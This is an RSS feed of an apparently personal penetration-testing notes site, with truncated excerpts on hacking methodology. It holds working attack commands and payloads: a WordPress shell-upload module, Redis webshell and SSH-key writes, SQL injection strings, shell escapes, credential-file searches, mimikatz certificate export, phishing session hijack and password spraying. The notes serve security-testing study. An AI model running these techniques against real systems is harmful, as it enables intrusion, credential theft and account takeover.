<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Hacking Methodology on My notes and snippets</title><link>https://dev-hugo.justin-p.me/notes/hacking/</link><description>Recent content in Hacking Methodology on My notes and snippets</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 10 Mar 2020 16:33:38 +0100</lastBuildDate><atom:link href="https://dev-hugo.justin-p.me/notes/hacking/index.xml" rel="self" type="application/rss+xml"/><item><title>encrypted password protected pdf</title><link>https://dev-hugo.justin-p.me/notes/hacking/general/crack-password-encrypted-pdf/</link><pubDate>Tue, 10 Mar 2020 16:43:47 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/general/crack-password-encrypted-pdf/</guid><description>encrypted password protected pdf source
pdfid check if pdf is encrypted (/Encrypt)
root@kali:/mnt/hgfs/_shared_folder# pdfid -n &amp;quot;0ld is g0ld.pdf&amp;quot; PDFiD 0.2.7 0ld is g0ld.pdf PDF Header: %PDF-1.6 obj 15 endobj 15 stream 5 endstream 5 xref 2 trailer 2 startxref 2 /Page 1 /Encrypt 2 /ObjStm 1 pdf-parser Where is /Encrypt (object 43)
root@kali:/mnt/hgfs/_shared_folder# pdf-parser -s /Encrypt &amp;quot;0ld is g0ld.pdf&amp;quot; trailer &amp;lt;&amp;lt; /Size 45 /Root 1 0 R /Info 10 0 R /ID [&amp;lt;5C8F37D2A45EB64E9DBBF71CA3E86861&amp;gt;&amp;lt;5C8F37D2A45EB64E9DBBF71CA3E86861&amp;gt;] /Encrypt 43 0 R &amp;gt;&amp;gt; trailer &amp;lt;&amp;lt; /Size 45 /Root 1 0 R /Info 10 0 R /ID [&amp;lt;5C8F37D2A45EB64E9DBBF71CA3E86861&amp;gt;&amp;lt;5C8F37D2A45EB64E9DBBF71CA3E86861&amp;gt;] /Encrypt 43 0 R /Prev 196676 /XRefStm 196344 &amp;gt;&amp;gt; show object 43</description></item><item><title>wpadmin plugin upload</title><link>https://dev-hugo.justin-p.me/notes/hacking/external/wordpress/wpadmin-plugin-upload/</link><pubDate>Tue, 10 Mar 2020 16:43:47 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/external/wordpress/wpadmin-plugin-upload/</guid><description>wpadmin plugin upload Abuse the plugin function to upload a shell.
msf &amp;gt; use exploit/unix/webapp/wp_admin_shell_upload msf exploit(wp_admin_shell_upload) &amp;gt; show targets ...targets... msf exploit(wp_admin_shell_upload) &amp;gt; set TARGET &amp;lt; target-id &amp;gt; msf exploit(wp_admin_shell_upload) &amp;gt; show options ...show and set options... msf exploit(wp_admin_shell_upload) &amp;gt; exploit or simply login, go the plugins, upload a file and go the the WP upload folder (wp-content/uploads)</description></item><item><title>encrypted password protected zip</title><link>https://dev-hugo.justin-p.me/notes/hacking/general/crack-password-protected-zip/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/general/crack-password-protected-zip/</guid><description>encrypted password protected zip zip2john extract zip hash
zip2john crackme.zip &amp;gt; crackeziphash.txt ver 2.0 efh 5455 efh 7875 crackme.zip/DoNotTouch PKZIP Encr: 2b chk, TS_chk, cmplen=335181, decmplen=884736, crc=E8183254 hashcat format remove zipfilename
zip2john crackme.zip | cut -d &amp;quot;:&amp;quot; -f 2 &amp;gt; ziphash.txt ver 2.0 efh 5455 efh 7875 crackme.zip/DoNotTouch PKZIP Encr: 2b chk, TS_chk, cmplen=335181, decmplen=884736, crc=E8183254 fcrackzip root@kali:~# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt zipfile.</description></item><item><title>priv esc</title><link>https://dev-hugo.justin-p.me/notes/hacking/general/priv-esc/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/general/priv-esc/</guid><description>priv esc Checklists g0tmi1k Linux Privilege Escalation hacktricks Linux Privilege Escalation fuzzysecurity Windows Privilege Escalation PowerSploit - PowerUp PayloadAllTheThings Scripts linPEAS winPEAS linenum MSF - local_exploit_suggester AonCyberLabs/Windows-Exploit-Suggester jondonas/linux-exploit-suggester-2 RastaMouse/Sherlock powershell &amp;quot;IEX(New-Object Net.</description></item><item><title>public key disclosure</title><link>https://dev-hugo.justin-p.me/notes/hacking/external/public-key-disclosure/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/external/public-key-disclosure/</guid><description>public key disclosure Very often keys are pushed to code repositories such as Github, Bitbucket or Gitlab. You want to identify a target code repo and search all commit history to discover secerts that might have been pushed.
Tools to search git repos
gitleaks # MOVE TO OWN TOOLS PAGE
gitrob # MOVE TO OWN TOOLS PAGE
truffleHog # MOVE TO OWN TOOLS PAGE</description></item><item><title>shell escaping</title><link>https://dev-hugo.justin-p.me/notes/hacking/general/shell-escaping/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/general/shell-escaping/</guid><description>shell escaping editors vim :!/bin/sh :set shell=/bin/sh :shell ed !'/bin/sh' ne Load Prefs nano CTRL+R CTRL+X reset; bash 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0 Pager More/Less Open a file that is larger then your terminal.
Run !'sh'
man Run !'sh'
This to works sinse man uses more/less.
pinfo press ! followed by the command you want to run.
Console Browsers pagers can also be used a editors in console browsers.</description></item><item><title>cloud-provider-web-servers</title><link>https://dev-hugo.justin-p.me/notes/hacking/external/cloud-provider-web-servers/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/external/cloud-provider-web-servers/</guid><description>Cloud provider web servers Cloud provider web servers have some special things you might not have on your &amp;lsquo;normal&amp;rsquo; webserver.
Azure windows webserver If you are able to comprimise an azure server you might be able to use mimikatz to extract certificates and try to authenticitate to Azure with them.
crypto::capi privilege::debug crypto::cng crypto::certificates /systemstore:local_machine/store:my /export AWS Instance Metadata Cloud server hosted on services like EC2 need a way to orient themselfs.</description></item><item><title>Credential Stuffing</title><link>https://dev-hugo.justin-p.me/notes/hacking/general/password-attacks/credential-stuffing/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/general/password-attacks/credential-stuffing/</guid><description>Credential Stuffing Web with Burp Website login POST -&amp;gt; intruder -&amp;gt; clear $ -&amp;gt; Highlight user/password params -&amp;gt; Attacktype Pitchfork -&amp;gt; payload 1, user list -&amp;gt; payload 2, pass list -&amp;gt; run</description></item><item><title>Misconfigured Cloud Assets</title><link>https://dev-hugo.justin-p.me/notes/hacking/external/misconfigured-cloud-assets/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/external/misconfigured-cloud-assets/</guid><description>Misconfigured Cloud Assets AWS Amazon Simple Storage Service (S3) Is secure by default. Can be made public. Nslookup can help reveal region.
AWS cli # list contents of bucket aws s3 ls s3://&amp;lt;bucketname&amp;gt;/ # download contents of bucket aws s3 sync s3://&amp;lt;bucketname&amp;gt;/ local-dir # s3 code injection aws s3 mv evil-script.html s3://&amp;lt;bucketname&amp;gt;/evil-script.html Tools: - cloud_enum # MOVE TO OWN TOOLS PAGE
S3 domain hijacking Look for 404&amp;rsquo;s to *.s3.amazonaws.com. If a bucket name is not in use you can register it and load your content on the site.</description></item><item><title>Password Spraying</title><link>https://dev-hugo.justin-p.me/notes/hacking/general/password-attacks/password-spraying/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/general/password-attacks/password-spraying/</guid><description>Password Spraying Microsoft Online https://github.com/justin-p/MSOLSpray
Watch out for AzureAD Smart lockout. Use fireprox and/or the delay param.
Web with Burp Website login POST -&amp;gt; intruder -&amp;gt; clear $ -&amp;gt; Highlight user param -&amp;gt; set password -&amp;gt; Attacktype Sniper -&amp;gt; payload 1, user list -&amp;gt; run</description></item><item><title>phising</title><link>https://dev-hugo.justin-p.me/notes/hacking/external/phising/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/external/phising/</guid><description>Phising Session Hijack Steal creds and/or session cookies. Can be useful when client has good prevention against shells.
Email a link to a target employee pointing to a cloned/proxied auth portal (Microsoft Online(O365, Azure), G-suite. AWS Console). When they auth they get a real session cookies, and so do we.
Tools: Evilginx2, Modlishka # MOVE TO OWN TOOL PAGE
When we get session we need to act fast and setup persistence.</description></item><item><title>post compromise recon</title><link>https://dev-hugo.justin-p.me/notes/hacking/general/post-compermise-recon/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/general/post-compermise-recon/</guid><description>Post compromise recon Who do we have access as ? What roles do we have ? is MFA enabled ? What can we access ? Who are the admins and how are we going to escalate to one ? Are there any security protections in place ? Onprem infrastructure Active Directory BloodHound PowerView RSAT Cloud Infrastucture AWS Use recon_all module of wierd all to gather a lot of info about our current permissions.</description></item><item><title>Redis</title><link>https://dev-hugo.justin-p.me/notes/hacking/general/redis-exploitation/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/general/redis-exploitation/</guid><description>Redis Webshell You must know the path of the Web site folder:
root@machine:~# redis-cli -h 10.10.10.10 10.85.0.52:6379&amp;gt; config set dir /usr/share/nginx/html OK 10.85.0.52:6379&amp;gt; config set dbfilename redis.php OK 10.85.0.52:6379&amp;gt; set test &amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot; OK 10.85.0.52:6379&amp;gt; save OK SSH Generate a ssh public-private key pair on your pc: ssh-keygen -t rsa Write the public key to a file : (echo -e &amp;ldquo;\n\n&amp;rdquo;; cat ./.ssh/id_rsa.pub; echo -e &amp;ldquo;\n\n&amp;rdquo;) &amp;gt; foo.</description></item><item><title>SQL Injection</title><link>https://dev-hugo.justin-p.me/notes/hacking/general/sql-injection/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/general/sql-injection/</guid><description>sql injection External stuff exploit-db ASCII table
Always True 1=1 a=a
Escape/stop mysql # -- #-- MySQL Verison select version()
information Schema Table names SELECT table_schema,table_name FROM information_Schema.tables SELECT CONCAT(table_schema,table_name) FROM information_Schema.tables SELECT CONCAT(table_schema,char(58),table_name) FROM information_Schema.tables Injection example 1 ' union (select CONCAT(table_schema,char(58),table_name) from information_Schema.tables where 1=1 ORDER BY table_name LIMIT 0,1) #-- dummymalex:dummyms table_schema = dummymalex table_name = dummyms Hide stuff we dont need AND table_schema !</description></item><item><title>steal access tokens</title><link>https://dev-hugo.justin-p.me/notes/hacking/internal/steal-access-tokens/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/internal/steal-access-tokens/</guid><description>steal access tokens GCP Google JSON TOkens and credentials.db are saved to disk.
JSON tokens are typically used for service account access to GCP. They can be used to authenticate with gcloud and/or ScouteSuite.
if a user authenticates with gcloud from a compute instance their creds are stored here: ~/.config/gcloud/credentials.db
sudo find /home -name &amp;quot;credentials.db&amp;quot;
Azure Azure Cloud Service Packages (.cspkg) cspkg are deployment files created by Visual Studio. They offer possiablty to in intergrate to azure services such as SQL, Storage, etc.</description></item><item><title>Certificate Transparency Logs</title><link>https://dev-hugo.justin-p.me/notes/hacking/external/certificate-transparency-logs/</link><pubDate>Tue, 10 Mar 2020 16:43:44 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/external/certificate-transparency-logs/</guid><description>Certificate Transparency Logs Certificate Transparency monitors and logs digital certs. This is publicly correlated in a searchable log. Using Certificate Transparency logs you may be able to find additional subdomains or other top level domains.
You could also search on a disclosed internal hostname from things such as e-mail headers and find the publicly accessible URL associated with this machine or other machines that share the internal domain (hostname01.domain.local, hostname02.domain.local) by looking at the x509v3 extension data.</description></item><item><title>Credential Gathering</title><link>https://dev-hugo.justin-p.me/notes/hacking/external/credential-gathering/</link><pubDate>Tue, 10 Mar 2020 16:43:44 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/external/credential-gathering/</guid><description>Credential Gathering When you want to infiltrate an organization gaining some form of credentials will be key. One of the ways to gain these credentials is to search database and other form of leaks. A user might reuse his password on multiple accounts or use a specific pattern in their passwords.
External services Service info weleakinfo Data Breach Search Engine scylla.sh db dumps and more (Search Engine) hashes.</description></item><item><title>DNS Recon</title><link>https://dev-hugo.justin-p.me/notes/hacking/external/dns-recon/</link><pubDate>Tue, 10 Mar 2020 16:43:44 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/external/dns-recon/</guid><description>DNS Recon When targeting an orgianization you want to know where their resources live. Apart from getting to know where their assets are most of the times these days there is a proxy infront of web applications that require the correct vhost (DNS hostname) to access them.
DNS Bruteforce Seclists has great wordlists for DNS bruteforce.
Try to find commonalities between domains and iterating names. Think about web01.domain.tld and web02.domain.tld, try web03,04,05 etc.</description></item><item><title>E-Mail Gathering</title><link>https://dev-hugo.justin-p.me/notes/hacking/external/user-enumeration/</link><pubDate>Tue, 10 Mar 2020 16:43:44 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/external/user-enumeration/</guid><description>User enumeration When you want to infiltrate an organization gaining some form of credentials will be key. One of the ways to gain these credentials would be to preform brute-force techniques, such as password spraying. But in order to preform these you would first need to have a list of potential usernames. This is where user enumeration comes in.
Username schema If the target organisation is Microsoft based you will most likely be able to use 2 usernames for each account.</description></item><item><title>Google Dorking</title><link>https://dev-hugo.justin-p.me/notes/hacking/external/google-dorking/</link><pubDate>Tue, 10 Mar 2020 16:43:44 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/external/google-dorking/</guid><description>Google Dorking Google dorks are search filters you can use in google. These allow you to find very specific sites (vendor/cms) or files.
External services Service info GHDB Google Hacking Database EXACT-MATCH Force an exact-match search. Use this to refine results for ambiguous searches, or to exclude synonyms when searching for single words.
&amp;quot;Dank memes&amp;quot; OR Search for X or Y.</description></item><item><title>Identify Technologies</title><link>https://dev-hugo.justin-p.me/notes/hacking/external/identify-technologies/</link><pubDate>Tue, 10 Mar 2020 16:43:44 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/external/identify-technologies/</guid><description>Identify Technologies Netblocks blocks URL Azure Public https://www.microsoft.com/en-us/download/details.aspx?id=56519 Azure US Gov http://www.microsoft.com/en-us/download/details.aspx?id=57063 Azure Germany http://www.microsoft.com/en-us/download/details.aspx?id=57064 Azure China http://www.microsoft.com/en-us/download/details.aspx?id=57062 AWS https://ip-ranges.amazonaws.com/ip-ranges.json GCP http://www.gstatic.com/ipranges/cloud.json Can be automated with https://github.com/oldrho/ip2provider # MOVE TO ITS OWN TOOL PAGE.
Microsoft Products Notes url Find out what ADFS is used to for to authenticate to https://adfs.</description></item><item><title>Shodan</title><link>https://dev-hugo.justin-p.me/notes/hacking/external/shodan/</link><pubDate>Tue, 10 Mar 2020 16:43:44 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/external/shodan/</guid><description>Shodan Shodan is a search engine for Internet-connected devices. Web search engines, such as Google and Bing, are great for finding websites. But what if you&amp;rsquo;re interested in measuring which countries are becoming more connected? Or if you want to know which version of Microsoft IIS is the most popular? Or you want to find the control servers for malware? Maybe a new vulnerability came out and you want to see how many hosts it could affect?</description></item><item><title>smb</title><link>https://dev-hugo.justin-p.me/notes/hacking/internal/smb/</link><pubDate>Tue, 10 Mar 2020 16:43:44 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/internal/smb/</guid><description>enum4linux Do everything enum4linux -a 192.168.88.129 smbclient protocol negotiation failed: NT_STATUS_IO_TIMEOUT Resolution: On Kali, edit /etc/samba/smb.conf Add the following under global: client min protocol = CORE client max protocol = SMB3 list smbclient -L \\\\10.10.10.10\\ download all files smbclient \\\\10.10.10.10\\share mask &amp;quot;&amp;quot; recurse ON prompt OFF cd &amp;quot;path\to\remote\dir&amp;quot; lcd &amp;quot;~/path/to/download/to/&amp;quot; mget *</description></item><item><title>Social Media</title><link>https://dev-hugo.justin-p.me/notes/hacking/external/social-media/</link><pubDate>Tue, 10 Mar 2020 16:43:44 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/external/social-media/</guid><description>social media TO DO
Related tools Tools Description</description></item><item><title>Web</title><link>https://dev-hugo.justin-p.me/notes/hacking/external/web/</link><pubDate>Tue, 10 Mar 2020 16:43:44 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/external/web/</guid><description>gobuster General scan ./go/bin/gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt -t 40 -e Bigger wordlist and extensions gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,sql -t 40 -e run trough burpsuite ~/go/bin/gobuster dir -u http://192.168.56.101:12380 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sql,html,txt -t 40 -e -p http://127.0.0.1:8080 kadimus LFI Scan &amp;amp; Exploit Tool (@hc0d3r - P0cL4bs Team)
general scan, through burp and save results kadimus -u http://192.168.56.103/?page=login --proxy http://127.0.0.1:8080 --output outputfile get file kadimus -u http://192.</description></item><item><title>Discover Open Ports</title><link>https://dev-hugo.justin-p.me/notes/hacking/general/port-scanning/</link><pubDate>Tue, 10 Mar 2020 16:33:38 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/general/port-scanning/</guid><description>Discover Open Ports In order to start testing something you first want to find out if it has any network ports open. Discovering what ports are open and what service is running behind is crucial and should be one of the first things you do after recon.
MOVE TO OWN TOOLS PAGE netdiscover netdiscover -r 192.168.1.0/24 MOVE TO OWN TOOLS PAGE masscan scan all ports masscan 10.11.0.0/16 scan port range masscan 10.</description></item></channel></rss>